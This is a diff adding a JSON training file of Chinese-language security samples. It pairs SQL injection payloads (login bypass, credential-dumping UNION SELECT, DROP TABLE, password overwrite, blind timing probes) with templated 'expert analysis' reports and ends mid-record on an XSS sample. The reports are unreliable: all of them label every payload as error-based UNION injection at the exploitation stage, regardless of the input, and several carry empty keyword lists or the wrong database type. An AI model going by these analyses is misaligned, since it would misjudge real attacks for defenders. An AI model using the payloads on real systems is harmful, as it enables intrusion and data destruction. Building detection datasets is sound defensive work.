@@ -1,0 +1,702 @@
+[
+  {
+    "sample_id": 1,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: SQL注入\n攻击阶段: 利用\n威胁等级: 高风险\n网络协议: HTTP\n源IP地址: 192.168.1.100\n目标IP地址: 10.0.0.1\n攻击时间: 2024-10-08 15:30:45\n\n攻击载荷:\n' OR '1'='1' --",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起典型的SQL注入攻击，攻击者通过在HTTP请求参数中注入恶意SQL代码，试图绕过应用程序的身份验证机制或窃取敏感数据库信息。\n\n技术细节：\n- 注入类型：基于错误的SQL注入\n- 注入点：HTTP GET/POST参数\n- 注入技术：UNION查询注入\n- 数据库类型：可能为MySQL/PostgreSQL\n- 攻击载荷特征：包含SQL关键字()\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 攻击复杂度：中等（需要基本的SQL知识）\n- 潜在影响：高（可能导致数据泄露、系统权限提升）\n- 利用难度：低（攻击工具广泛可用）\n\n**3. 攻击阶段分析**\n当前攻击处于\"利用\"阶段，攻击者已经：\n✓ 完成信息收集（识别SQL注入点）\n✓ 构造攻击载荷\n✓ 发起攻击尝试\n下一步可能进行：数据提取、权限提升、系统控制\n\n**4. 防护建议**\n**立即措施：**\n- 阻断攻击源IP：192.168.1.100\n- 检查数据库访问日志\n- 验证是否存在数据泄露\n\n**技术防护：**\n- 实施Web应用防火墙(WAF)\n- 对所有用户输入进行参数化查询\n- 部署输入验证和过滤机制\n- 实施数据库权限最小化原则\n\n**管理措施：**\n- 进行安全代码审计\n- 更新安全开发规范\n- 建立SQL注入检测规则\n- 定期进行渗透测试",
+    "metadata": {
+      "attack_type": "SQL注入",
+      "attack_stage": "利用",
+      "threat_level": "高风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "SQL注入"
+    }
+  },
+  {
+    "sample_id": 2,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: SQL注入\n攻击阶段: 利用\n威胁等级: 高风险\n网络协议: HTTPS\n源IP地址: 172.16.0.50\n目标IP地址: 10.0.0.2\n攻击时间: 2024-10-08 15:31:20\n\n攻击载荷:\nadmin' UNION SELECT username,password FROM users--",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起典型的SQL注入攻击，攻击者通过在HTTP请求参数中注入恶意SQL代码，试图绕过应用程序的身份验证机制或窃取敏感数据库信息。\n\n技术细节：\n- 注入类型：基于错误的SQL注入\n- 注入点：HTTP GET/POST参数\n- 注入技术：UNION查询注入\n- 数据库类型：可能为MySQL/PostgreSQL\n- 攻击载荷特征：包含SQL关键字(SELECT, UNION)\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 攻击复杂度：中等（需要基本的SQL知识）\n- 潜在影响：高（可能导致数据泄露、系统权限提升）\n- 利用难度：低（攻击工具广泛可用）\n\n**3. 攻击阶段分析**\n当前攻击处于\"利用\"阶段，攻击者已经：\n✓ 完成信息收集（识别SQL注入点）\n✓ 构造攻击载荷\n✓ 发起攻击尝试\n下一步可能进行：数据提取、权限提升、系统控制\n\n**4. 防护建议**\n**立即措施：**\n- 阻断攻击源IP：172.16.0.50\n- 检查数据库访问日志\n- 验证是否存在数据泄露\n\n**技术防护：**\n- 实施Web应用防火墙(WAF)\n- 对所有用户输入进行参数化查询\n- 部署输入验证和过滤机制\n- 实施数据库权限最小化原则\n\n**管理措施：**\n- 进行安全代码审计\n- 更新安全开发规范\n- 建立SQL注入检测规则\n- 定期进行渗透测试",
+    "metadata": {
+      "attack_type": "SQL注入",
+      "attack_stage": "利用",
+      "threat_level": "高风险",
+      "protocol": "HTTPS",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "SQL注入"
+    }
+  },
+  {
+    "sample_id": 3,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: SQL注入\n攻击阶段: 武器化\n威胁等级: 中风险\n网络协议: HTTP\n源IP地址: 10.1.1.25\n目标IP地址: 192.168.100.10\n攻击时间: 2024-10-08 15:32:10\n\n攻击载荷:\n'; DROP TABLE users; --",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起典型的SQL注入攻击，攻击者通过在HTTP请求参数中注入恶意SQL代码，试图绕过应用程序的身份验证机制或窃取敏感数据库信息。\n\n技术细节：\n- 注入类型：基于错误的SQL注入\n- 注入点：HTTP GET/POST参数\n- 注入技术：UNION查询注入\n- 数据库类型：可能为MySQL/PostgreSQL\n- 攻击载荷特征：包含SQL关键字(DROP)\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 攻击复杂度：中等（需要基本的SQL知识）\n- 潜在影响：高（可能导致数据泄露、系统权限提升）\n- 利用难度：低（攻击工具广泛可用）\n\n**3. 攻击阶段分析**\n当前攻击处于\"利用\"阶段，攻击者已经：\n✓ 完成信息收集（识别SQL注入点）\n✓ 构造攻击载荷\n✓ 发起攻击尝试\n下一步可能进行：数据提取、权限提升、系统控制\n\n**4. 防护建议**\n**立即措施：**\n- 阻断攻击源IP：10.1.1.25\n- 检查数据库访问日志\n- 验证是否存在数据泄露\n\n**技术防护：**\n- 实施Web应用防火墙(WAF)\n- 对所有用户输入进行参数化查询\n- 部署输入验证和过滤机制\n- 实施数据库权限最小化原则\n\n**管理措施：**\n- 进行安全代码审计\n- 更新安全开发规范\n- 建立SQL注入检测规则\n- 定期进行渗透测试",
+    "metadata": {
+      "attack_type": "SQL注入",
+      "attack_stage": "武器化",
+      "threat_level": "中风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "SQL注入"
+    }
+  },
+  {
+    "sample_id": 4,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: SQL注入\n攻击阶段: 侦察\n威胁等级: 中风险\n网络协议: HTTP\n源IP地址: 203.0.113.1\n目标IP地址: 10.0.0.1\n攻击时间: 2024-10-08 15:33:05\n\n攻击载荷:\n1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起典型的SQL注入攻击，攻击者通过在HTTP请求参数中注入恶意SQL代码，试图绕过应用程序的身份验证机制或窃取敏感数据库信息。\n\n技术细节：\n- 注入类型：基于错误的SQL注入\n- 注入点：HTTP GET/POST参数\n- 注入技术：UNION查询注入\n- 数据库类型：可能为MySQL/PostgreSQL\n- 攻击载荷特征：包含SQL关键字(SELECT)\n\n**2. 威胁等级评估**\n- 当前威胁等级：中风险\n- 攻击复杂度：中等（需要基本的SQL知识）\n- 潜在影响：高（可能导致数据泄露、系统权限提升）\n- 利用难度：低（攻击工具广泛可用）\n\n**3. 攻击阶段分析**\n当前攻击处于\"利用\"阶段，攻击者已经：\n✓ 完成信息收集（识别SQL注入点）\n✓ 构造攻击载荷\n✓ 发起攻击尝试\n下一步可能进行：数据提取、权限提升、系统控制\n\n**4. 防护建议**\n**立即措施：**\n- 阻断攻击源IP：203.0.113.1\n- 检查数据库访问日志\n- 验证是否存在数据泄露\n\n**技术防护：**\n- 实施Web应用防火墙(WAF)\n- 对所有用户输入进行参数化查询\n- 部署输入验证和过滤机制\n- 实施数据库权限最小化原则\n\n**管理措施：**\n- 进行安全代码审计\n- 更新安全开发规范\n- 建立SQL注入检测规则\n- 定期进行渗透测试",
+    "metadata": {
+      "attack_type": "SQL注入",
+      "attack_stage": "侦察",
+      "threat_level": "中风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "中风险",
+      "expected_attack_category": "SQL注入"
+    }
+  },
+  {
+    "sample_id": 5,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: SQL注入\n攻击阶段: 利用\n威胁等级: 高风险\n网络协议: HTTPS\n源IP地址: 198.51.100.15\n目标IP地址: 10.0.0.3\n攻击时间: 2024-10-08 15:34:12\n\n攻击载荷:\n' OR 1=1 AND SLEEP(5)--",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起典型的SQL注入攻击，攻击者通过在HTTP请求参数中注入恶意SQL代码，试图绕过应用程序的身份验证机制或窃取敏感数据库信息。\n\n技术细节：\n- 注入类型：基于错误的SQL注入\n- 注入点：HTTP GET/POST参数\n- 注入技术：UNION查询注入\n- 数据库类型：可能为MySQL/PostgreSQL\n- 攻击载荷特征：包含SQL关键字()\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 攻击复杂度：中等（需要基本的SQL知识）\n- 潜在影响：高（可能导致数据泄露、系统权限提升）\n- 利用难度：低（攻击工具广泛可用）\n\n**3. 攻击阶段分析**\n当前攻击处于\"利用\"阶段，攻击者已经：\n✓ 完成信息收集（识别SQL注入点）\n✓ 构造攻击载荷\n✓ 发起攻击尝试\n下一步可能进行：数据提取、权限提升、系统控制\n\n**4. 防护建议**\n**立即措施：**\n- 阻断攻击源IP：198.51.100.15\n- 检查数据库访问日志\n- 验证是否存在数据泄露\n\n**技术防护：**\n- 实施Web应用防火墙(WAF)\n- 对所有用户输入进行参数化查询\n- 部署输入验证和过滤机制\n- 实施数据库权限最小化原则\n\n**管理措施：**\n- 进行安全代码审计\n- 更新安全开发规范\n- 建立SQL注入检测规则\n- 定期进行渗透测试",
+    "metadata": {
+      "attack_type": "SQL注入",
+      "attack_stage": "利用",
+      "threat_level": "高风险",
+      "protocol": "HTTPS",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "SQL注入"
+    }
+  },
+  {
+    "sample_id": 6,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: SQL注入\n攻击阶段: 投递\n威胁等级: 中风险\n网络协议: HTTP\n源IP地址: 192.0.2.100\n目标IP地址: 10.0.0.4\n攻击时间: 2024-10-08 15:35:08\n\n攻击载荷:\nadmin'/**/OR/**/1=1--",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起典型的SQL注入攻击，攻击者通过在HTTP请求参数中注入恶意SQL代码，试图绕过应用程序的身份验证机制或窃取敏感数据库信息。\n\n技术细节：\n- 注入类型：基于错误的SQL注入\n- 注入点：HTTP GET/POST参数\n- 注入技术：UNION查询注入\n- 数据库类型：可能为MySQL/PostgreSQL\n- 攻击载荷特征：包含SQL关键字()\n\n**2. 威胁等级评估**\n- 当前威胁等级：中风险\n- 攻击复杂度：中等（需要基本的SQL知识）\n- 潜在影响：高（可能导致数据泄露、系统权限提升）\n- 利用难度：低（攻击工具广泛可用）\n\n**3. 攻击阶段分析**\n当前攻击处于\"利用\"阶段，攻击者已经：\n✓ 完成信息收集（识别SQL注入点）\n✓ 构造攻击载荷\n✓ 发起攻击尝试\n下一步可能进行：数据提取、权限提升、系统控制\n\n**4. 防护建议**\n**立即措施：**\n- 阻断攻击源IP：192.0.2.100\n- 检查数据库访问日志\n- 验证是否存在数据泄露\n\n**技术防护：**\n- 实施Web应用防火墙(WAF)\n- 对所有用户输入进行参数化查询\n- 部署输入验证和过滤机制\n- 实施数据库权限最小化原则\n\n**管理措施：**\n- 进行安全代码审计\n- 更新安全开发规范\n- 建立SQL注入检测规则\n- 定期进行渗透测试",
+    "metadata": {
+      "attack_type": "SQL注入",
+      "attack_stage": "投递",
+      "threat_level": "中风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "中风险",
+      "expected_attack_category": "SQL注入"
+    }
+  },
+  {
+    "sample_id": 7,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: SQL注入\n攻击阶段: 利用\n威胁等级: 高风险\n网络协议: HTTPS\n源IP地址: 172.20.0.25\n目标IP地址: 10.0.0.5\n攻击时间: 2024-10-08 15:36:15\n\n攻击载荷:\n' UNION SELECT @@version,database(),user()--",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起典型的SQL注入攻击，攻击者通过在HTTP请求参数中注入恶意SQL代码，试图绕过应用程序的身份验证机制或窃取敏感数据库信息。\n\n技术细节：\n- 注入类型：基于错误的SQL注入\n- 注入点：HTTP GET/POST参数\n- 注入技术：UNION查询注入\n- 数据库类型：可能为MySQL/PostgreSQL\n- 攻击载荷特征：包含SQL关键字(SELECT, UNION)\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 攻击复杂度：中等（需要基本的SQL知识）\n- 潜在影响：高（可能导致数据泄露、系统权限提升）\n- 利用难度：低（攻击工具广泛可用）\n\n**3. 攻击阶段分析**\n当前攻击处于\"利用\"阶段，攻击者已经：\n✓ 完成信息收集（识别SQL注入点）\n✓ 构造攻击载荷\n✓ 发起攻击尝试\n下一步可能进行：数据提取、权限提升、系统控制\n\n**4. 防护建议**\n**立即措施：**\n- 阻断攻击源IP：172.20.0.25\n- 检查数据库访问日志\n- 验证是否存在数据泄露\n\n**技术防护：**\n- 实施Web应用防火墙(WAF)\n- 对所有用户输入进行参数化查询\n- 部署输入验证和过滤机制\n- 实施数据库权限最小化原则\n\n**管理措施：**\n- 进行安全代码审计\n- 更新安全开发规范\n- 建立SQL注入检测规则\n- 定期进行渗透测试",
+    "metadata": {
+      "attack_type": "SQL注入",
+      "attack_stage": "利用",
+      "threat_level": "高风险",
+      "protocol": "HTTPS",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "SQL注入"
+    }
+  },
+  {
+    "sample_id": 8,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: SQL注入\n攻击阶段: 武器化\n威胁等级: 高风险\n网络协议: HTTP\n源IP地址: 10.10.10.50\n目标IP地址: 192.168.1.10\n攻击时间: 2024-10-08 15:37:22\n\n攻击载荷:\n'; UPDATE users SET password='hacked' WHERE id=1--",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起典型的SQL注入攻击，攻击者通过在HTTP请求参数中注入恶意SQL代码，试图绕过应用程序的身份验证机制或窃取敏感数据库信息。\n\n技术细节：\n- 注入类型：基于错误的SQL注入\n- 注入点：HTTP GET/POST参数\n- 注入技术：UNION查询注入\n- 数据库类型：可能为MySQL/PostgreSQL\n- 攻击载荷特征：包含SQL关键字(UPDATE)\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 攻击复杂度：中等（需要基本的SQL知识）\n- 潜在影响：高（可能导致数据泄露、系统权限提升）\n- 利用难度：低（攻击工具广泛可用）\n\n**3. 攻击阶段分析**\n当前攻击处于\"利用\"阶段，攻击者已经：\n✓ 完成信息收集（识别SQL注入点）\n✓ 构造攻击载荷\n✓ 发起攻击尝试\n下一步可能进行：数据提取、权限提升、系统控制\n\n**4. 防护建议**\n**立即措施：**\n- 阻断攻击源IP：10.10.10.50\n- 检查数据库访问日志\n- 验证是否存在数据泄露\n\n**技术防护：**\n- 实施Web应用防火墙(WAF)\n- 对所有用户输入进行参数化查询\n- 部署输入验证和过滤机制\n- 实施数据库权限最小化原则\n\n**管理措施：**\n- 进行安全代码审计\n- 更新安全开发规范\n- 建立SQL注入检测规则\n- 定期进行渗透测试",
+    "metadata": {
+      "attack_type": "SQL注入",
+      "attack_stage": "武器化",
+      "threat_level": "高风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "SQL注入"
+    }
+  },
+  {
+    "sample_id": 9,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: SQL注入\n攻击阶段: 侦察\n威胁等级: 低风险\n网络协议: HTTP\n源IP地址: 203.0.113.200\n目标IP地址: 10.0.0.6\n攻击时间: 2024-10-08 15:38:30\n\n攻击载荷:\n1' ORDER BY 10--",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起典型的SQL注入攻击，攻击者通过在HTTP请求参数中注入恶意SQL代码，试图绕过应用程序的身份验证机制或窃取敏感数据库信息。\n\n技术细节：\n- 注入类型：基于错误的SQL注入\n- 注入点：HTTP GET/POST参数\n- 注入技术：UNION查询注入\n- 数据库类型：可能为MySQL/PostgreSQL\n- 攻击载荷特征：包含SQL关键字()\n\n**2. 威胁等级评估**\n- 当前威胁等级：低风险\n- 攻击复杂度：中等（需要基本的SQL知识）\n- 潜在影响：高（可能导致数据泄露、系统权限提升）\n- 利用难度：低（攻击工具广泛可用）\n\n**3. 攻击阶段分析**\n当前攻击处于\"利用\"阶段，攻击者已经：\n✓ 完成信息收集（识别SQL注入点）\n✓ 构造攻击载荷\n✓ 发起攻击尝试\n下一步可能进行：数据提取、权限提升、系统控制\n\n**4. 防护建议**\n**立即措施：**\n- 阻断攻击源IP：203.0.113.200\n- 检查数据库访问日志\n- 验证是否存在数据泄露\n\n**技术防护：**\n- 实施Web应用防火墙(WAF)\n- 对所有用户输入进行参数化查询\n- 部署输入验证和过滤机制\n- 实施数据库权限最小化原则\n\n**管理措施：**\n- 进行安全代码审计\n- 更新安全开发规范\n- 建立SQL注入检测规则\n- 定期进行渗透测试",
+    "metadata": {
+      "attack_type": "SQL注入",
+      "attack_stage": "侦察",
+      "threat_level": "低风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "低风险",
+      "expected_attack_category": "SQL注入"
+    }
+  },
+  {
+    "sample_id": 10,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: SQL注入\n攻击阶段: 利用\n威胁等级: 高风险\n网络协议: HTTPS\n源IP地址: 198.51.100.88\n目标IP地址: 10.0.0.7\n攻击时间: 2024-10-08 15:39:18\n\n攻击载荷:\n' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a'--",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起典型的SQL注入攻击，攻击者通过在HTTP请求参数中注入恶意SQL代码，试图绕过应用程序的身份验证机制或窃取敏感数据库信息。\n\n技术细节：\n- 注入类型：基于错误的SQL注入\n- 注入点：HTTP GET/POST参数\n- 注入技术：UNION查询注入\n- 数据库类型：可能为MySQL/PostgreSQL\n- 攻击载荷特征：包含SQL关键字(SELECT)\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 攻击复杂度：中等（需要基本的SQL知识）\n- 潜在影响：高（可能导致数据泄露、系统权限提升）\n- 利用难度：低（攻击工具广泛可用）\n\n**3. 攻击阶段分析**\n当前攻击处于\"利用\"阶段，攻击者已经：\n✓ 完成信息收集（识别SQL注入点）\n✓ 构造攻击载荷\n✓ 发起攻击尝试\n下一步可能进行：数据提取、权限提升、系统控制\n\n**4. 防护建议**\n**立即措施：**\n- 阻断攻击源IP：198.51.100.88\n- 检查数据库访问日志\n- 验证是否存在数据泄露\n\n**技术防护：**\n- 实施Web应用防火墙(WAF)\n- 对所有用户输入进行参数化查询\n- 部署输入验证和过滤机制\n- 实施数据库权限最小化原则\n\n**管理措施：**\n- 进行安全代码审计\n- 更新安全开发规范\n- 建立SQL注入检测规则\n- 定期进行渗透测试",
+    "metadata": {
+      "attack_type": "SQL注入",
+      "attack_stage": "利用",
+      "threat_level": "高风险",
+      "protocol": "HTTPS",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "SQL注入"
+    }
+  },
+  {
+    "sample_id": 11,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: SQL注入\n攻击阶段: 投递\n威胁等级: 中风险\n网络协议: HTTP\n源IP地址: 192.0.2.150\n目标IP地址: 10.0.0.8\n攻击时间: 2024-10-08 15:40:25\n\n攻击载荷:\nadmin' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects))--",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起典型的SQL注入攻击，攻击者通过在HTTP请求参数中注入恶意SQL代码，试图绕过应用程序的身份验证机制或窃取敏感数据库信息。\n\n技术细节：\n- 注入类型：基于错误的SQL注入\n- 注入点：HTTP GET/POST参数\n- 注入技术：UNION查询注入\n- 数据库类型：可能为MySQL/PostgreSQL\n- 攻击载荷特征：包含SQL关键字(SELECT)\n\n**2. 威胁等级评估**\n- 当前威胁等级：中风险\n- 攻击复杂度：中等（需要基本的SQL知识）\n- 潜在影响：高（可能导致数据泄露、系统权限提升）\n- 利用难度：低（攻击工具广泛可用）\n\n**3. 攻击阶段分析**\n当前攻击处于\"利用\"阶段，攻击者已经：\n✓ 完成信息收集（识别SQL注入点）\n✓ 构造攻击载荷\n✓ 发起攻击尝试\n下一步可能进行：数据提取、权限提升、系统控制\n\n**4. 防护建议**\n**立即措施：**\n- 阻断攻击源IP：192.0.2.150\n- 检查数据库访问日志\n- 验证是否存在数据泄露\n\n**技术防护：**\n- 实施Web应用防火墙(WAF)\n- 对所有用户输入进行参数化查询\n- 部署输入验证和过滤机制\n- 实施数据库权限最小化原则\n\n**管理措施：**\n- 进行安全代码审计\n- 更新安全开发规范\n- 建立SQL注入检测规则\n- 定期进行渗透测试",
+    "metadata": {
+      "attack_type": "SQL注入",
+      "attack_stage": "投递",
+      "threat_level": "中风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "中风险",
+      "expected_attack_category": "SQL注入"
+    }
+  },
+  {
+    "sample_id": 12,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: SQL注入\n攻击阶段: 利用\n威胁等级: 高风险\n网络协议: HTTPS\n源IP地址: 172.30.0.100\n目标IP地址: 10.0.0.9\n攻击时间: 2024-10-08 15:41:12\n\n攻击载荷:\n' OR 1=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起典型的SQL注入攻击，攻击者通过在HTTP请求参数中注入恶意SQL代码，试图绕过应用程序的身份验证机制或窃取敏感数据库信息。\n\n技术细节：\n- 注入类型：基于错误的SQL注入\n- 注入点：HTTP GET/POST参数\n- 注入技术：UNION查询注入\n- 数据库类型：可能为MySQL/PostgreSQL\n- 攻击载荷特征：包含SQL关键字(SELECT)\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 攻击复杂度：中等（需要基本的SQL知识）\n- 潜在影响：高（可能导致数据泄露、系统权限提升）\n- 利用难度：低（攻击工具广泛可用）\n\n**3. 攻击阶段分析**\n当前攻击处于\"利用\"阶段，攻击者已经：\n✓ 完成信息收集（识别SQL注入点）\n✓ 构造攻击载荷\n✓ 发起攻击尝试\n下一步可能进行：数据提取、权限提升、系统控制\n\n**4. 防护建议**\n**立即措施：**\n- 阻断攻击源IP：172.30.0.100\n- 检查数据库访问日志\n- 验证是否存在数据泄露\n\n**技术防护：**\n- 实施Web应用防火墙(WAF)\n- 对所有用户输入进行参数化查询\n- 部署输入验证和过滤机制\n- 实施数据库权限最小化原则\n\n**管理措施：**\n- 进行安全代码审计\n- 更新安全开发规范\n- 建立SQL注入检测规则\n- 定期进行渗透测试",
+    "metadata": {
+      "attack_type": "SQL注入",
+      "attack_stage": "利用",
+      "threat_level": "高风险",
+      "protocol": "HTTPS",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "SQL注入"
+    }
+  },
+  {
+    "sample_id": 13,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: SQL注入\n攻击阶段: 武器化\n威胁等级: 高风险\n网络协议: HTTP\n源IP地址: 10.20.20.75\n目标IP地址: 192.168.2.20\n攻击时间: 2024-10-08 15:42:08\n\n攻击载荷:\n'; INSERT INTO users (username,password) VALUES ('hacker','password')--",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起典型的SQL注入攻击，攻击者通过在HTTP请求参数中注入恶意SQL代码，试图绕过应用程序的身份验证机制或窃取敏感数据库信息。\n\n技术细节：\n- 注入类型：基于错误的SQL注入\n- 注入点：HTTP GET/POST参数\n- 注入技术：UNION查询注入\n- 数据库类型：可能为MySQL/PostgreSQL\n- 攻击载荷特征：包含SQL关键字(INSERT)\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 攻击复杂度：中等（需要基本的SQL知识）\n- 潜在影响：高（可能导致数据泄露、系统权限提升）\n- 利用难度：低（攻击工具广泛可用）\n\n**3. 攻击阶段分析**\n当前攻击处于\"利用\"阶段，攻击者已经：\n✓ 完成信息收集（识别SQL注入点）\n✓ 构造攻击载荷\n✓ 发起攻击尝试\n下一步可能进行：数据提取、权限提升、系统控制\n\n**4. 防护建议**\n**立即措施：**\n- 阻断攻击源IP：10.20.20.75\n- 检查数据库访问日志\n- 验证是否存在数据泄露\n\n**技术防护：**\n- 实施Web应用防火墙(WAF)\n- 对所有用户输入进行参数化查询\n- 部署输入验证和过滤机制\n- 实施数据库权限最小化原则\n\n**管理措施：**\n- 进行安全代码审计\n- 更新安全开发规范\n- 建立SQL注入检测规则\n- 定期进行渗透测试",
+    "metadata": {
+      "attack_type": "SQL注入",
+      "attack_stage": "武器化",
+      "threat_level": "高风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "SQL注入"
+    }
+  },
+  {
+    "sample_id": 14,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: SQL注入\n攻击阶段: 利用\n威胁等级: 高风险\n网络协议: HTTPS\n源IP地址: 203.0.113.50\n目标IP地址: 10.0.0.10\n攻击时间: 2024-10-08 15:43:15\n\n攻击载荷:\n' OR (SELECT COUNT(*) FROM admin)>0 AND SLEEP(3)--",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起典型的SQL注入攻击，攻击者通过在HTTP请求参数中注入恶意SQL代码，试图绕过应用程序的身份验证机制或窃取敏感数据库信息。\n\n技术细节：\n- 注入类型：基于错误的SQL注入\n- 注入点：HTTP GET/POST参数\n- 注入技术：UNION查询注入\n- 数据库类型：可能为MySQL/PostgreSQL\n- 攻击载荷特征：包含SQL关键字(SELECT)\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 攻击复杂度：中等（需要基本的SQL知识）\n- 潜在影响：高（可能导致数据泄露、系统权限提升）\n- 利用难度：低（攻击工具广泛可用）\n\n**3. 攻击阶段分析**\n当前攻击处于\"利用\"阶段，攻击者已经：\n✓ 完成信息收集（识别SQL注入点）\n✓ 构造攻击载荷\n✓ 发起攻击尝试\n下一步可能进行：数据提取、权限提升、系统控制\n\n**4. 防护建议**\n**立即措施：**\n- 阻断攻击源IP：203.0.113.50\n- 检查数据库访问日志\n- 验证是否存在数据泄露\n\n**技术防护：**\n- 实施Web应用防火墙(WAF)\n- 对所有用户输入进行参数化查询\n- 部署输入验证和过滤机制\n- 实施数据库权限最小化原则\n\n**管理措施：**\n- 进行安全代码审计\n- 更新安全开发规范\n- 建立SQL注入检测规则\n- 定期进行渗透测试",
+    "metadata": {
+      "attack_type": "SQL注入",
+      "attack_stage": "利用",
+      "threat_level": "高风险",
+      "protocol": "HTTPS",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "SQL注入"
+    }
+  },
+  {
+    "sample_id": 15,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: SQL注入\n攻击阶段: 侦察\n威胁等级: 中风险\n网络协议: HTTP\n源IP地址: 198.51.100.125\n目标IP地址: 10.0.0.11\n攻击时间: 2024-10-08 15:44:22\n\n攻击载荷:\n1' AND LENGTH((SELECT database()))>5--",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起典型的SQL注入攻击，攻击者通过在HTTP请求参数中注入恶意SQL代码，试图绕过应用程序的身份验证机制或窃取敏感数据库信息。\n\n技术细节：\n- 注入类型：基于错误的SQL注入\n- 注入点：HTTP GET/POST参数\n- 注入技术：UNION查询注入\n- 数据库类型：可能为MySQL/PostgreSQL\n- 攻击载荷特征：包含SQL关键字(SELECT)\n\n**2. 威胁等级评估**\n- 当前威胁等级：中风险\n- 攻击复杂度：中等（需要基本的SQL知识）\n- 潜在影响：高（可能导致数据泄露、系统权限提升）\n- 利用难度：低（攻击工具广泛可用）\n\n**3. 攻击阶段分析**\n当前攻击处于\"利用\"阶段，攻击者已经：\n✓ 完成信息收集（识别SQL注入点）\n✓ 构造攻击载荷\n✓ 发起攻击尝试\n下一步可能进行：数据提取、权限提升、系统控制\n\n**4. 防护建议**\n**立即措施：**\n- 阻断攻击源IP：198.51.100.125\n- 检查数据库访问日志\n- 验证是否存在数据泄露\n\n**技术防护：**\n- 实施Web应用防火墙(WAF)\n- 对所有用户输入进行参数化查询\n- 部署输入验证和过滤机制\n- 实施数据库权限最小化原则\n\n**管理措施：**\n- 进行安全代码审计\n- 更新安全开发规范\n- 建立SQL注入检测规则\n- 定期进行渗透测试",
+    "metadata": {
+      "attack_type": "SQL注入",
+      "attack_stage": "侦察",
+      "threat_level": "中风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "中风险",
+      "expected_attack_category": "SQL注入"
+    }
+  },
+  {
+    "sample_id": 16,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: XSS攻击\n攻击阶段: 投递\n威胁等级: 中风险\n网络协议: HTTP\n源IP地址: 192.168.1.50\n目标IP地址: 10.0.0.1\n攻击时间: 2024-10-08 15:45:10\n\n攻击载荷:\n<script>alert('XSS')</script>",
